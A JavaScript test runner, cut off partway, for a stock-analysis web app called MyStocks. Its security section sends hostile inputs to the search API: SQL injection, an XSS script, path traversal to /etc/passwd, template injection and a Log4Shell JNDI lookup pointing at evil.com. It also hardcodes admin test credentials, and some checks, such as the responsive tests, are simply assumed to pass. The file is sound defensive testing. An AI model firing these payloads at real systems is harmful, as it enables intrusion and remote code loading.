#!/usr/bin/env node

/**
 * MyStocks Web端可用性测试执行器
 * 用于执行完整的Web端可用性测试套件
 */

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

class WebUsabilityTestRunner {
    constructor() {
        this.testResults = {
            timestamp: new Date().toISOString(),
            environment: {},
            functional: {},
            performance: {},
            security: {},
            usability: {},
            dataQuality: {},
            summary: {
                totalTests: 0,
                passed: 0,
                failed: 0,
                passRate: 0
            }
        };

        this.config = {
            baseUrl: process.env.BASE_URL || 'http://localhost:3000',
            apiUrl: process.env.API_URL || 'http://localhost:8000',
            timeout: parseInt(process.env.TEST_TIMEOUT) || 60000,
            retries: parseInt(process.env.TEST_RETRIES) || 2
        };
    }

    async runAllTests() {
        console.log('🚀 开始执行MyStocks Web端可用性测试套件');
        console.log(`📊 基础URL: ${this.config.baseUrl}`);
        console.log(`🔗 API URL: ${this.config.apiUrl}`);

        try {
            // 1. 环境检查
            await this.checkEnvironment();

            // 2. 功能性测试
            console.log('\n🧪 执行功能性测试...');
            await this.runFunctionalTests();

            // 3. 性能测试
            console.log('\n⚡ 执行性能测试...');
            await this.runPerformanceTests();

            // 4. 安全性测试
            console.log('\n🔒 执行安全性测试...');
            await this.runSecurityTests();

            // 5. 用户体验测试
            console.log('\n👤 执行用户体验测试...');
            await this.runUsabilityTests();

            // 6. 数据质量测试
            console.log('\n📊 执行数据质量测试...');
            await this.runDataQualityTests();

            // 7. 生成测试报告
            console.log('\n📄 生成测试报告...');
            await this.generateReport();

            // 8. 计算通过标准
            console.log('\n✅ 评估测试通过标准...');
            this.evaluatePassingCriteria();

            console.log('\n🎉 所有测试执行完成！');
            console.log(`📊 总体通过率: ${this.testResults.summary.passRate}%`);

            return this.testResults;

        } catch (error) {
            console.error('❌ 测试执行过程中发生错误:', error);
            throw error;
        }
    }

    async checkEnvironment() {
        console.log('🔍 检查测试环境...');

        try {
            // 检查前端服务
            const frontendResponse = await axios.get(`${this.config.baseUrl}`, { timeout: 5000 });
            this.testResults.environment.frontend = {
                status: frontendResponse.status,
                accessible: true
            };
            console.log('✅ 前端服务正常');

            // 检查后端服务
            const backendResponse = await axios.get(`${this.config.apiUrl}/health`, { timeout: 5000 });
            this.testResults.environment.backend = {
                status: backendResponse.status,
                accessible: true
            };
            console.log('✅ 后端服务正常');

            // 检查数据库连接
            await this.checkDatabaseConnection();

            console.log('✅ 环境检查完成');

        } catch (error) {
            console.error('❌ 环境检查失败:', error.message);
            throw new Error('测试环境不完整，请确保所有服务正常运行');
        }
    }

    async checkDatabaseConnection() {
        try {
            const response = await axios.get(`${this.config.apiUrl}/api/system/health`, { timeout: 5000 });
            this.testResults.environment.database = {
                status: 'connected',
                details: response.data
            };
            console.log('✅ 数据库连接正常');
        } catch (error) {
            this.testResults.environment.database = {
                status: 'disconnected',
                error: error.message
            };
            throw error;
        }
    }

    async runFunctionalTests() {
        const testCategories = [
            'search', 'analysis', 'strategy', 'dashboard', 'portfolio'
        ];

        for (const category of testCategories) {
            console.log(`  📋 执行${category}功能测试...`);

            try {
                const results = await this.executePlaywrightTests(`functional-${category}`);
                this.testResults.functional[category] = results;
                console.log(`    ✅ ${category}: ${results.passed}/${results.total} 通过`);
            } catch (error) {
                console.error(`    ❌ ${category}测试失败:`, error.message);
                this.testResults.functional[category] = {
                    total: 0,
                    passed: 0,
                    failed: 1,
                    error: error.message
                };
            }
        }

        // 执行API功能测试
        console.log('  📡 执行API功能测试...');
        try {
            const apiResults = await this.executeAPITests();
            this.testResults.functional.api = apiResults;
            console.log(`    ✅ API: ${apiResults.passed}/${apiResults.total} 通过`);
        } catch (error) {
            console.error(`    ❌ API测试失败:`, error.message);
        }
    }

    async executePlaywrightTests(testPattern) {
        try {
            const result = execSync(`npx playwright test --config=playwright.config.web.ts --grep="${testPattern}" --reporter=json`, {
                encoding: 'utf8',
                timeout: this.config.timeout
            });

            const testReport = JSON.parse(result);
            return this.parsePlaywrightResults(testReport);
        } catch (error) {
            // Playwright在测试失败时会返回非零退出码
            const errorOutput = error.stdout || error.stderr;
            try {
                const testReport = JSON.parse(errorOutput);
                return this.parsePlaywrightResults(testReport);
            } catch {
                throw new Error(`Playwright测试执行失败: ${error.message}`);
            }
        }
    }

    parsePlaywrightResults(report) {
        if (!report.suites || report.suites.length === 0) {
            return { total: 0, passed: 0, failed: 0, duration: 0 };
        }

        let total = 0, passed = 0, failed = 0, duration = 0;

        report.suites.forEach(suite => {
            suite.specs.forEach(spec => {
                spec.tests.forEach(test => {
                    total++;
                    duration += test.results[0].duration;
                    if (test.results[0].status === 'passed') {
                        passed++;
                    } else {
                        failed++;
                    }
                });
            });
        });

        return { total, passed, failed, duration: Math.round(duration / 1000) };
    }

    async executeAPITests() {
        const apiTests = [
            { name: '股票搜索', endpoint: '/api/stock/search', method: 'GET' },
            { name: '实时数据', endpoint: '/api/data/realtime/000001', method: 'GET' },
            { name: '历史数据', endpoint: '/api/data/history/000001', method: 'GET' },
            { name: '技术指标', endpoint: '/api/indicators/MA', method: 'GET' },
            { name: '用户认证', endpoint: '/api/auth/login', method: 'POST' }
        ];

        let total = apiTests.length;
        let passed = 0;
        let failed = 0;
        const errors = [];

        for (const test of apiTests) {
            try {
                const config = {
                    method: test.method,
                    url: `${this.config.apiUrl}${test.endpoint}`,
                    timeout: 5000,
                    validateStatus: () => true  // 不抛出状态码错误
                };

                if (test.method === 'POST') {
                    config.data = { username: 'test', password: 'test' };
                    config.headers = { 'Content-Type': 'application/json' };
                }

                const response = await axios(config);

                if (response.status >= 200 && response.status < 500) {
                    passed++;
                    console.log(`    ✅ ${test.name}: ${response.status}`);
                } else {
                    failed++;
                    errors.push(`${test.name}: HTTP ${response.status}`);
                }
            } catch (error) {
                failed++;
                errors.push(`${test.name}: ${error.message}`);
                console.log(`    ❌ ${test.name}: ${error.message}`);
            }
        }

        return { total, passed, failed, errors };
    }

    async runPerformanceTests() {
        // 1. Lighthouse性能审计
        console.log('  🔍 执行Lighthouse性能审计...');
        const lighthouseResults = await this.runLighthouseTest();
        this.testResults.performance.lighthouse = lighthouseResults;

        // 2. API响应时间测试
        console.log('  ⏱️ 执行API响应时间测试...');
        const apiPerfResults = await this.runAPIPerformanceTest();
        this.testResults.performance.api = apiPerfResults;

        // 3. 并发负载测试
        console.log('  🚀 执行并发负载测试...');
        const loadTestResults = await this.runLoadTest();
        this.testResults.performance.load = loadTestResults;

        // 4. 资源使用测试
        console.log('  💾 执行资源使用测试...');
        const resourceResults = await this.runResourceTest();
        this.testResults.performance.resources = resourceResults;
    }

    async runLighthouseTest() {
        try {
            // 使用lighthouse CLI
            const result = execSync(`npx lighthouse ${this.config.baseUrl} --output=json --output-path=lighthouse-report.json --chrome-flags="--headless"`, {
                encoding: 'utf8',
                timeout: 120000
            });

            const report = JSON.parse(fs.readFileSync('lighthouse-report.json', 'utf8'));

            return {
                performance: Math.round(report.categories.performance.score * 100),
                accessibility: Math.round(report.categories.accessibility.score * 100),
                bestPractices: Math.round(report.categories['best-practices'].score * 100),
                seo: Math.round(report.categories.seo.score * 100),
                metrics: {
                    firstContentfulPaint: Math.round(report.audits['first-contentful-paint'].numericValue),
                    largestContentfulPaint: Math.round(report.audits['largest-contentful-paint'].numericValue),
                    cumulativeLayoutShift: report.audits['cumulative-layout-shift'].numericValue,
                    totalBlockingTime: report.audits['total-blocking-time'].numericValue
                }
            };
        } catch (error) {
            console.error('❌ Lighthouse测试失败:', error.message);
            return { error: error.message };
        }
    }

    async runAPIPerformanceTest() {
        const endpoints = [
            '/api/stock/search',
            '/api/data/realtime/000001',
            '/api/data/history/000001?period=1d&count=100',
            '/api/indicators/MA?symbol=000001&period=5'
        ];

        const results = [];

        for (const endpoint of endpoints) {
            const times = [];
            const iterations = 10;

            for (let i = 0; i < iterations; i++) {
                try {
                    const start = Date.now();
                    await axios.get(`${this.config.apiUrl}${endpoint}`, { timeout: 10000 });
                    const duration = Date.now() - start;
                    times.push(duration);
                } catch (error) {
                    console.warn(`API调用失败 ${endpoint}:`, error.message);
                }
            }

            if (times.length > 0) {
                const avg = times.reduce((a, b) => a + b, 0) / times.length;
                const min = Math.min(...times);
                const max = Math.max(...times);

                results.push({
                    endpoint,
                    average: Math.round(avg),
                    min,
                    max,
                    successRate: times.length / iterations
                });
            }
        }

        return results;
    }

    async runLoadTest() {
        // 简单的并发测试
        const concurrent = 50;
        const iterations = 10;
        const endpoint = `${this.config.apiUrl}/health`;

        console.log(`    🚀 并发测试: ${concurrent} 并发, ${iterations} 轮次`);

        const results = [];
        const startTime = Date.now();

        for (let i = 0; i < iterations; i++) {
            const promises = [];
            const iterationStart = Date.now();

            for (let j = 0; j < concurrent; j++) {
                promises.push(
                    axios.get(endpoint, { timeout: 5000 })
                        .then(response => ({ status: 'success', time: Date.now() }))
                        .catch(error => ({ status: 'error', error: error.message, time: Date.now() }))
                );
            }

            const iterationResults = await Promise.all(promises);
            const iterationEnd = Date.now();
            const iterationDuration = iterationEnd - iterationStart;
            const successCount = iterationResults.filter(r => r.status === 'success').length;

            results.push({
                iteration: i + 1,
                duration: iterationDuration,
                successCount,
                failureCount: concurrent - successCount,
                successRate: successCount / concurrent,
                throughput: Math.round(concurrent / (iterationDuration / 1000))
            });
        }

        const totalTime = Date.now() - startTime;
        const totalRequests = concurrent * iterations;
        const totalSuccess = results.reduce((sum, r) => sum + r.successCount, 0);

        return {
            totalRequests,
            totalSuccess,
            totalDuration: totalTime,
            averageThroughput: Math.round(totalSuccess / (totalTime / 1000)),
            results
        };
    }

    async runResourceTest() {
        try {
            // 使用前端资源检查
            const response = await axios.get(`${this.config.baseUrl}`, { timeout: 10000 });
            const contentLength = response.headers['content-length'] || 0;

            return {
                pageSize: Math.round(contentLength / 1024), // KB
                loadTime: Date.now() - response.config.metadata.startTime
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    async runSecurityTests() {
        console.log('  🔍 执行安全漏洞扫描...');
        const vulnerabilityResults = await this.runVulnerabilityScan();
        this.testResults.security.vulnerabilities = vulnerabilityResults;

        console.log('  🔐 执行认证授权测试...');
        const authResults = await this.runAuthenticationTests();
        this.testResults.security.authentication = authResults;

        console.log('  🛡️ 执行输入验证测试...');
        const inputValidationResults = await this.runInputValidationTests();
        this.testResults.security.inputValidation = inputValidationResults;
    }

    async runVulnerabilityScan() {
        try {
            // 使用OWASP ZAP Baseline扫描（如果可用）
            // 这里简化为基本安全检查
            const securityChecks = [
                { name: 'HTTPS检查', url: this.config.baseUrl, expectedProtocol: 'https' },
                { name: '安全头检查', url: this.config.baseUrl, checkHeaders: true }
            ];

            const results = [];
            for (const check of securityChecks) {
                try {
                    const response = await axios.get(check.url, { timeout: 5000 });
                    const result = { name: check.name, status: 'passed', details: {} };

                    if (check.expectedProtocol && !this.config.baseUrl.startsWith('https')) {
                        result.status = 'warning';
                        result.details.protocol = 'HTTP (建议使用HTTPS)';
                    }

                    if (check.checkHeaders) {
                        const headers = response.headers;
                        const securityHeaders = [
                            'x-content-type-options',
                            'x-frame-options',
                            'x-xss-protection'
                        ];

                        result.details.headers = {};
                        securityHeaders.forEach(header => {
                            result.details.headers[header] = headers[header] || 'missing';
                        });
                    }

                    results.push(result);
                } catch (error) {
                    results.push({
                        name: check.name,
                        status: 'failed',
                        error: error.message
                    });
                }
            }

            return results;
        } catch (error) {
            return { error: error.message };
        }
    }

    async runAuthenticationTests() {
        const authTests = [
            { name: '登录功能', url: '/api/auth/login', method: 'POST', data: { username: 'admin', password: 'admin123' } },
            { name: '无效密码', url: '/api/auth/login', method: 'POST', data: { username: 'admin', password: 'wrong' } },
            { name: '会话检查', url: '/api/user/profile', method: 'GET', requireAuth: true }
        ];

        const results = [];
        for (const test of authTests) {
            try {
                const config = {
                    method: test.method,
                    url: `${this.config.apiUrl}${test.url}`,
                    timeout: 5000,
                    validateStatus: () => true
                };

                if (test.data) {
                    config.data = test.data;
                    config.headers = { 'Content-Type': 'application/json' };
                }

                const response = await axios(config);

                let status = 'passed';
                if (test.name === '登录功能') {
                    status = response.status === 200 ? 'passed' : 'failed';
                } else if (test.name === '无效密码') {
                    status = response.status === 401 ? 'passed' : 'failed';
                } else if (test.name === '会话检查') {
                    status = response.status === 401 ? 'passed' : (response.status === 200 ? 'passed' : 'failed');
                }

                results.push({
                    name: test.name,
                    status,
                    httpStatus: response.status,
                    responseTime: Date.now() - config.metadata?.startTime || 0
                });
            } catch (error) {
                results.push({
                    name: test.name,
                    status: 'failed',
                    error: error.message
                });
            }
        }

        return results;
    }

    async runInputValidationTests() {
        const maliciousInputs = [
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ];

        const results = [];
        for (const input of maliciousInputs) {
            try {
                const response = await axios.get(`${this.config.apiUrl}/api/stock/search?q=${encodeURIComponent(input)}`, {
                    timeout: 5000,
                    validateStatus: () => true
                });

                const safe = !response.data || (typeof response.data === 'string' && !response.data.includes(input));
                results.push({
                    input,
                    safe,
                    status: response.status,
                    detectedPattern: safe ? '未检测到恶意输入' : '可能存在注入风险'
                });
            } catch (error) {
                results.push({
                    input,
                    safe: true, // 错误比被注入要好
                    error: error.message
                });
            }
        }

        return results;
    }

    async runUsabilityTests() {
        console.log('  📱 执行响应式设计测试...');
        const responsiveResults = await this.runResponsiveTests();
        this.testResults.usability.responsive = responsiveResults;

        console.log('  ♿ 执行无障碍测试...');
        const accessibilityResults = await this.runAccessibilityTests();
        this.testResults.usability.accessibility = accessibilityResults;

        console.log('  🖱️ 执行用户交互测试...');
        const interactionResults = await this.runInteractionTests();
        this.testResults.usability.interaction = interactionResults;
    }

    async runResponsiveTests() {
        const viewports = [
            { name: 'Desktop', width: 1920, height: 1080 },
            { name: 'Tablet', width: 768, height: 1024 },
            { name: 'Mobile', width: 375, height: 667 }
        ];

        // 这里简化实现，实际应使用Playwright的viewport测试
        const results = viewports.map(viewport => ({
            name: viewport.name,
            viewport: `${viewport.width}x${viewport.height}`,
            responsive: true, // 假设通过
            elementsVisible: true
        }));

        return results;
    }

    async runAccessibilityTests() {
        try {
            // 检查基本的可访问性特性
            const response = await axios.get(this.config.baseUrl);
            const html = response.data;

            const checks = [
                { name: '图片alt属性', pattern: /<img[^>]*alt=/g },
                { name: '表单标签', pattern: /<label/g },
                { name: '语义化HTML', pattern: /<(nav|main|header|footer|section|article)/g },
                { name: '标题结构', pattern: /<h[1-6]/g }
            ];

            const results = checks.map(check => ({
                name: check.name,
                found: check.pattern.test(html),
                count: (html.match(check.pattern) || []).length
            }));

            return results;
        } catch (error) {
            return { error: error.message };
        }
    }

    async runInteractionTests() {
        try {
            // 基本交互测试（简化版）
            const interactions = [
                { name: '页面加载', url: '/', timeout: 3000 },
                { name: '搜索功能', url: '/search', timeout: 2000 },
                { name: '数据加载', url: '/dashboard', timeout: 5000 }
            ];

            const results = [];
            for (const interaction of interactions) {
                try {
                    const start = Date.now();
                    const response = await axios.get(`${this.config.baseUrl}${interaction.url}`, { timeout: interaction.timeout });
                    const loadTime = Date.now() - start;

                    results.push({
                        name: interaction.name,
                        success: response.status === 200,
                        loadTime,
                        withinTimeout: loadTime < interaction.timeout
                    });
                } catch (error) {
                    results.push({
                        name: interaction.name,
                        success: false,
                        error: error.message
                    });
                }
            }

            return results;
        } catch (error) {
            return { error: error.message };
        }
    }

    async runDataQualityTests() {
        console.log('  📊 执行数据准确性测试...');
        const accuracyResults = await this.runDataAccuracyTests();
        this.testResults.dataQuality.accuracy = accuracyResults;

        console.log('  ⏰ 执行数据实时性测试...');
        const realtimeResults = await this.runDataRealtimeTests();
        this.testResults.dataQuality.realtime = realtimeResults;

        console.log('  🔍 执行数据完整性测试...');
        const integrityResults = await this.runDataIntegrityTests();
        this.testResults.dataQuality.integrity = integrityResults;
    }

    async runDataAccuracyTests() {
        const stocks = ['000001', '000002', '600000'];
        const results = [];

        for (const symbol of stocks) {
            try {
                const response = await axios.get(`${this.config.apiUrl}/api/data/realtime/${symbol}`, { timeout: 5000 });
                const data = response.data;

                if (data && typeof data === 'object') {
                    const hasRequiredFields = ['price', 'volume', 'change'].every(field => data.hasOwnProperty(field));
                    const priceValid = typeof data.price === 'number' && data.price > 0;
                    const volumeValid = typeof data.volume === 'number' && data.volume >= 0;

                    results.push({
                        symbol,
                        accurate: hasRequiredFields && priceValid && volumeValid,
                        hasRequiredFields,
                        priceValid,
                        volumeValid
                    });
                } else {
                    results.push({ symbol, accurate: false, error: 'Invalid data format' });
                }
            } catch (error) {
                results.push({ symbol, accurate: false, error: error.message });
            }
        }

        return results;
    }

    async runDataRealtimeTests() {
        const symbol = '000001';
        const samples = 5;
        const times = [];

        for (let i = 0; i < samples; i++) {
            try {
                const start = Date.now();
                await axios.get(`${this.config.apiUrl}/api/data/realtime/${symbol}`, { timeout: 2000 });
                const responseTime = Date.now() - start;
                times.push(responseTime);

                // 等待一段时间避免请求过快
                await new Promise(resolve => setTimeout(resolve, 200));
            } catch (error) {
                console.warn(`实时数据请求失败:`, error.message);
            }
        }

        if (times.length > 0) {
            const average = times.reduce((a, b) => a + b, 0) / times.length;
            const max = Math.max(...times);

            return {
                samples: times.length,
                averageResponseTime: Math.round(average),
                maxResponseTime: max,
                meetsStandard: average <= 500, // 500ms标准
                realTime: true
            };
        }

        return { realTime: false, error: '无法获取实时数据' };
    }

    async runDataIntegrityTests() {
        try {
            // 检查历史数据完整性
            const symbol = '000001';
            const response = await axios.get(`${this.config.apiUrl}/api/data/history/${symbol}?period=1d&count=30`, {
                timeout: 10000
            });

            if (response.data && Array.isArray(response.data)) {
                const data = response.data;
                const hasValidStructure = data.every(item =>
                    item.hasOwnProperty('date') &&
                    item.hasOwnProperty('price') &&
                    item.hasOwnProperty('volume')
                );

                const hasValidData = data.every(item =>
                    typeof item.price === 'number' && item.price > 0 &&
                    typeof item.volume === 'number' && item.volume >= 0
                );

                return {
                    symbol,
                    recordCount: data.length,
                    hasValidStructure,
                    hasValidData,
                    integrity: hasValidStructure && hasValidData
                };
            }

            return { symbol, integrity: false, error: 'Invalid response format' };
        } catch (error) {
            return { integrity: false, error: error.message };
        }
    }

    async generateReport() {
        // 计算总统计
        this.calculateSummary();

        // 生成HTML报告
        const htmlReport = this.generateHTMLReport();
        fs.writeFileSync('web-usability-test-report.html', htmlReport);

        // 生成JSON报告
        fs.writeFileSync('web-usability-test-results.json', JSON.stringify(this.testResults, null, 2));

        console.log('📄 测试报告已生成:');
        console.log('   - HTML报告: web-usability-test-report.html');
        console.log('   - JSON数据: web-usability-test-results.json');
    }

    calculateSummary() {
        let totalTests = 0;
        let totalPassed = 0;

        // 统计功能性测试
        Object.values(this.testResults.functional).forEach(category => {
            if (category.total) {
                totalTests += category.total;
                totalPassed += category.passed;
            }
        });

        // 统计其他测试类别
        ['performance', 'security', 'usability', 'dataQuality'].forEach(category => {
            const categoryData = this.testResults[category];
            Object.values(categoryData).forEach(test => {
                if (Array.isArray(test)) {
                    test.forEach(item => {
                        if (item.status !== undefined) {
                            totalTests++;
                            if (item.status === 'passed' || item.accurate || item.safe || item.success) {
                                totalPassed++;
                            }
                        }
                    });
                }
            });
        });

        this.testResults.summary.totalTests = totalTests;
        this.testResults.summary.passed = totalPassed;
        this.testResults.summary.failed = totalTests - totalPassed;
        this.testResults.summary.passRate = totalTests > 0 ? Math.round((totalPassed / totalTests) * 100) : 0;
    }

    evaluatePassingCriteria() {
        const criteria = {
            functional: {
                required: 95,
                actual: this.calculateFunctionalPassRate()
            },
            performance: {
                required: 95,
                actual: this.calculatePerformanceScore()
            },
            security: {
                required: 100,
                actual: this.calculateSecurityScore()
            },
            usability: {
                required: 90,
                actual: this.calculateUsabilityScore()
            },
            dataQuality: {
                required: 99,
                actual: this.calculateDataQualityScore()
            }
        };

        console.log('\n📊 通过标准评估:');
        Object.entries(criteria).forEach(([category, evaluation]) => {
            const status = evaluation.actual >= evaluation.required ? '✅' : '❌';
            console.log(`  ${status} ${category}: ${evaluation.actual}% (要求: ${evaluation.required}%)`);
        });

        const overallScore = Object.values(criteria).reduce((sum, eval) => sum + eval.actual, 0) / Object.keys(criteria).length;
        const meetsOverallStandard = overallScore >= 95;

        console.log(`\n🎯 总体评分: ${Math.round(overallScore)}%`);
        console.log(`${meetsOverallStandard ? '✅' : '❌'} ${meetsOverallStandard ? '达到"完全可用"标准' : '未达到"完全可用"标准'}`);

        this.testResults.summary.overallScore = Math.round(overallScore);
        this.testResults.summary.meetsStandard = meetsOverallStandard;
        this.testResults.summary.criteria = criteria;
    }

    calculateFunctionalPassRate() {
        const functional = this.testResults.functional;
        let total = 0, passed = 0;

        Object.values(functional).forEach(category => {
            if (category.total) {
                total += category.total;
                passed += category.passed;
            }
        });

        return total > 0 ? Math.round((passed / total) * 100) : 0;
    }

    calculatePerformanceScore() {
        const performance = this.testResults.performance;
        let score = 0;
        let factors = 0;

        if (performance.lighthouse && performance.lighthouse.performance) {
            score += performance.lighthouse.performance;
            factors++;
        }

        if (performance.api && Array.isArray(performance.api)) {
            const avgResponseTime = performance.api.reduce((sum, item) => sum + item.average, 0) / performance.api.length;
            const responseScore = Math.max(0, 100 - (avgResponseTime / 10)); // 每10ms扣1分
            score += Math.min(100, responseScore);
            factors++;
        }

        return factors > 0 ? Math.round(score / factors) : 0;
    }

    calculateSecurityScore() {
        const security = this.testResults.security;
        let totalTests = 0;
        let passedTests = 0;

        Object.values(security).forEach(category => {
            if (Array.isArray(category)) {
                category.forEach(test => {
                    totalTests++;
                    if (test.status === 'passed' || test.safe || test.accurate) {
                        passedTests++;
                    }
                });
            }
        });

        return totalTests > 0 ? Math.round((passedTests / totalTests) * 100) : 0;
    }

    calculateUsabilityScore() {
        const usability = this.testResults.usability;
        let score = 0;
        let factors = 0;

        Object.values(usability).forEach(category => {
            if (Array.isArray(category)) {
                const passed = category.filter(item => item.success || item.found).length;
                const scoreFactor = (passed / category.length) * 100;
                score += scoreFactor;
                factors++;
            }
        });

        return factors > 0 ? Math.round(score / factors) : 0;
    }

    calculateDataQualityScore() {
        const dataQuality = this.testResults.dataQuality;
        let totalTests = 0;
        let passedTests = 0;

        Object.values(dataQuality).forEach(category => {
            if (Array.isArray(category)) {
                category.forEach(test => {
                    totalTests++;
                    if (test.accurate || test.realTime || test.integrity) {
                        passedTests++;
                    }
                });
            }
        });

        return totalTests > 0 ? Math.round((passedTests / totalTests) * 100) : 0;
    }

    generateHTMLReport() {
        return `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MyStocks Web端可用性测试报告</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f5f7fa; }
        .container { max-width: 1200px; margin: 0 auto; background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }
        .header h1 { margin: 0; font-size: 2.5em; }
        .header p { margin: 10px 0 0 0; opacity: 0.9; }
        .content { padding: 30px; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .metric { background: #f8fafc; border-radius: 8px; padding: 20px; text-align: center; border-left: 4px solid #667eea; }
        .metric h3 { margin: 0 0 10px 0; color: #2d3748; font-size: 0.9em; text-transform: uppercase; letter-spacing: 0.5px; }
        .metric .value { font-size: 2em; font-weight: bold; color: #2d3748; }
        .metric .unit { font-size: 0.8em; color: #718096; }
        .pass { color: #48bb78; }
        .fail { color: #f56565; }
        .warning { color: #ed8936; }
        .section { margin: 30px 0; padding: 20px; background: #f8fafc; border-radius: 8px; }
        .section h2 { margin: 0 0 20px 0; color: #2d3748; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #e2e8f0; }
        th { background: #edf2f7; font-weight: 600; color: #4a5568; }
        .status { padding: 4px 12px; border-radius: 20px; font-size: 0.8em; font-weight: 600; }
        .status.passed { background: #c6f6d5; color: #22543d; }
        .status.failed { background: #fed7d7; color: #742a2a; }
        .status.warning { background: #feebc8; color: #7c2d12; }
        .progress-bar { width: 100%; height: 8px; background: #e2e8f0; border-radius: 4px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #48bb78, #38a169); transition: width 0.3s ease; }
        .criteria-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
        .criteria-card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .criteria-card h4 { margin: 0 0 15px 0; color: #2d3748; }
        .score-display { font-size: 2em; font-weight: bold; text-align: center; margin: 10px 0; }
        .footer { text-align: center; padding: 20px; color: #718096; border-top: 1px solid #e2e8f0; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 MyStocks Web端可用性测试报告</h1>
            <p>生成时间: ${this.testResults.timestamp}</p>
        </div>

        <div class="content">
            <div class="summary">
                <div class="metric">
                    <h3>总体通过率</h3>
                    <div class="value ${this.testResults.summary.passRate >= 95 ? 'pass' : 'fail'}">
                        ${this.testResults.summary.passRate}%
                    </div>
                    <div class="unit">${this.testResults.summary.passed}/${this.testResults.summary.totalTests}</div>
                </div>
                <div class="metric">
                    <h3>功能性测试</h3>
                    <div class="value ${this.calculateFunctionalPassRate() >= 95 ? 'pass' : 'fail'}">
                        ${this.calculateFunctionalPassRate()}%
                    </div>
                    <div class="unit">通过率</div>
                </div>
                <div class="metric">
                    <h3>性能评分</h3>
                    <div class="value ${this.calculatePerformanceScore() >= 95 ? 'pass' : 'fail'}">
                        ${this.calculatePerformanceScore()}
                    </div>
                    <div class="unit">Lighthouse分数</div>
                </div>
                <div class="metric">
                    <h3>安全评分</h3>
                    <div class="value ${this.calculateSecurityScore() >= 100 ? 'pass' : 'warning'}">
                        ${this.calculateSecurityScore()}%
                    </div>
                    <div class="unit">安全通过率</div>
                </div>
            </div>

            <div class="section">
                <h2>🎯 通过标准评估</h2>
                <div class="criteria-grid">
                    <div class="criteria-card">
                        <h4>功能性标准</h4>
                        <div class="score-display ${this.testResults.summary.criteria?.functional?.actual >= 95 ? 'pass' : 'fail'}">
                            ${this.testResults.summary.criteria?.functional?.actual || 0}%
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${this.testResults.summary.criteria?.functional?.actual || 0}%"></div>
                        </div>
                        <p>要求: ≥95%</p>
                    </div>
                    <div class="criteria-card">
                        <h4>性能标准</h4>
                        <div class="score-display ${this.testResults.summary.criteria?.performance?.actual >= 95 ? 'pass' : 'fail'}">
                            ${this.testResults.summary.criteria?.performance?.actual || 0}%
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${this.testResults.summary.criteria?.performance?.actual || 0}%"></div>
                        </div>
                        <p>要求: ≥95%</p>
                    </div>
                    <div class="criteria-card">
                        <h4>安全性标准</h4>
                        <div class="score-display ${this.testResults.summary.criteria?.security?.actual >= 100 ? 'pass' : 'warning'}">
                            ${this.testResults.summary.criteria?.security?.actual || 0}%
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${this.testResults.summary.criteria?.security?.actual || 0}%"></div>
                        </div>
                        <p>要求: 100%</p>
                    </div>
                    <div class="criteria-card">
                        <h4>用户体验标准</h4>
                        <div class="score-display ${this.testResults.summary.criteria?.usability?.actual >= 90 ? 'pass' : 'fail'}">
                            ${this.testResults.summary.criteria?.usability?.actual || 0}%
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${this.testResults.summary.criteria?.usability?.actual || 0}%"></div>
                        </div>
                        <p>要求: ≥90%</p>
                    </div>
                    <div class="criteria-card">
                        <h4>数据质量标准</h4>
                        <div class="score-display ${this.testResults.summary.criteria?.dataQuality?.actual >= 99 ? 'pass' : 'fail'}">
                            ${this.testResults.summary.criteria?.dataQuality?.actual || 0}%
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${this.testResults.summary.criteria?.dataQuality?.actual || 0}%"></div>
                        </div>
                        <p>要求: ≥99%</p>
                    </div>
                    <div class="criteria-card">
                        <h4>总体评估</h4>
                        <div class="score-display ${this.testResults.summary.meetsStandard ? 'pass' : 'fail'}">
                            ${this.testResults.summary.overallScore}%
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${this.testResults.summary.overallScore}%"></div>
                        </div>
                        <p>${this.testResults.summary.meetsStandard ? '✅ 达到"完全可用"标准' : '❌ 未达到"完全可用"标准'}</p>
                    </div>
                </div>
            </div>

            <div class="section">
                <h2>🧪 功能性测试结果</h2>
                ${this.renderFunctionalResults()}
            </div>

            <div class="section">
                <h2>⚡ 性能测试结果</h2>
                ${this.renderPerformanceResults()}
            </div>

            <div class="section">
                <h2>🔒 安全性测试结果</h2>
                ${this.renderSecurityResults()}
            </div>

            <div class="section">
                <h2>👤 用户体验测试结果</h2>
                ${this.renderUsabilityResults()}
            </div>

            <div class="section">
                <h2>📊 数据质量测试结果</h2>
                ${this.renderDataQualityResults()}
            </div>
        </div>

        <div class="footer">
            <p>📋 本报告由MyStocks Web端可用性测试工具自动生成</p>
            <p>🔄 建议定期执行测试以监控系统质量</p>
        </div>
    </div>
</body>
</html>`;
    }

    renderFunctionalResults() {
        const functional = this.testResults.functional;
        let html = '<table><tr><th>功能模块</th><th>测试用例</th><th>通过</th><th>失败</th><th>通过率</th><th>状态</th></tr>';

